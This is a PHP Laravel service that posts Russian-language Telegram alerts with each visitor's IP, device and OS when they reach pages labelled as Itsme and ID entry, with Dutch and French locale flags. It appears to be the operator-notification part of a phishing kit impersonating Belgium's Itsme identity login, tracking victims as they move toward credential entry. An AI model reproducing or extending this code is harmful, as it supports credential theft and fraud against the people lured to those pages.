<?php

declare(strict_types=1);

namespace App\Services;

use App\DTOs\TelegramMessageDTO;
use Illuminate\Http\Request;

/**
 * Handles anonymous /visit notifications.
 */
class VisitNotificationService
{
    public function __construct(
        private readonly TelegramService $telegramService,
        private readonly DeviceDetectionService $deviceDetectionService,
        private readonly ClientIpResolver $clientIpResolver,
    ) {}

    public function notifyAnonymousVisit(Request $request, string $eventType, string $locale): void
    {
        $chatId = $this->telegramService->getGroupChatId();
        if (! $this->telegramService->isConfigured() || $chatId === null) {
            return;
        }

        $domain = (string) $request->getHost();
        $userAgent = (string) $request->header('User-Agent', '');
        $ipAddress = $this->clientIpResolver->resolve($request);

        $deviceType = $this->deviceDetectionService->detectDeviceType($userAgent);
        $deviceLabel = match ($deviceType) {
            'mobile' => 'Телефон',
            'tablet' => 'Планшет',
            default => 'Компьютер',
        };

        $title = match ($eventType) {
            'itsme' => '📴 <b>Переход на ввод Itsme</b>',
            'id', 'code' => '📵 <b>Переход на ввод ID</b>',
            'terms' => '📄 <b>Переход на ознакомление с офертой</b>',
            default => '🌐 <b>Визит без сессии</b>',
        };

        $localeFlag = match ($locale) {
            'nl' => '🇳🇱',
            'fr' => '🇫🇷',
            default => '🌍',
        };

        $text = "{$title} {$localeFlag}\n";
        $text .= 'Домен: <code>'.$this->escapeHtml($domain)."</code>\n";
        $text .= 'IP: <code>'.$this->escapeHtml($ipAddress)."</code>\n";
        $text .= '▫️ '.$this->escapeHtml($deviceLabel).', '.$this->escapeHtml($this->detectOs($userAgent));

        $this->telegramService->sendMessage(TelegramMessageDTO::create(
            chatId: $chatId,
            text: $text,
        ));
    }

    private function detectOs(string $userAgent): string
    {
        if ($userAgent === '') {
            return 'Unknown OS';
        }

        return match (true) {
            (bool) preg_match('/Windows NT 10\\.0/i', $userAgent) => 'Windows 10',
            (bool) preg_match('/Windows NT 6\\.3/i', $userAgent) => 'Windows 8.1',
            (bool) preg_match('/Windows NT 6\\.2/i', $userAgent) => 'Windows 8',
            (bool) preg_match('/Windows NT 6\\.1/i', $userAgent) => 'Windows 7',
            (bool) preg_match('/Windows NT 6\\.0/i', $userAgent) => 'Windows Vista',
            (bool) preg_match('/Windows NT 5\\.1|Windows XP/i', $userAgent) => 'Windows XP',
            (bool) preg_match('/Android/i', $userAgent) => 'Android',
            (bool) preg_match('/iPhone|iPad|iPod/i', $userAgent) => 'iOS',
            (bool) preg_match('/Mac OS X|Macintosh/i', $userAgent) => 'macOS',
            (bool) preg_match('/Linux/i', $userAgent) => 'Linux',
            default => 'Unknown OS',
        };
    }

    private function escapeHtml(string $value): string
    {
        return htmlspecialchars($value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }
}
